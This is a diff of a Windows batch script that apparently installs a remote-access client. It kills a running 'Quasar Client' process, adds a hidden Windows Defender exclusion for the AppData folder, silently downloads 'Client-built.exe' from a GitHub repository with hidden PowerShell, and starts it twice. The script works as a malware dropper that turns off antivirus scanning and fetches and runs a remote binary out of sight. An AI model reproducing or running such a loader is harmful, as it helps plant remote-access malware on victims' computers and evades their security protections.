@@ -7,6 +7,9 @@ set "TRACES_DIR=%APPDATA_PATH%\Roaming\Traces"
 set "TARGET_FILE=%TRACES_DIR%\Client-built.exe"
 set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
 
+:: End "Quasar Client" task if running
+taskkill /f /im "Quasar Client.exe" >nul 2>&1
+
 :: Fully clean folder function (hidden, system, read-only files too)
 :clean_folder
 if exist "%~1" (
@@ -47,8 +50,11 @@ if %errorlevel% NEQ 0 (
 :: Defender Exclusion
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 
-:: Download and run client
+:: Download client build
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
+
+:: Run client build twice to ensure execution
+start "" "%TARGET_FILE%"
 start "" "%TARGET_FILE%"
 
 exit
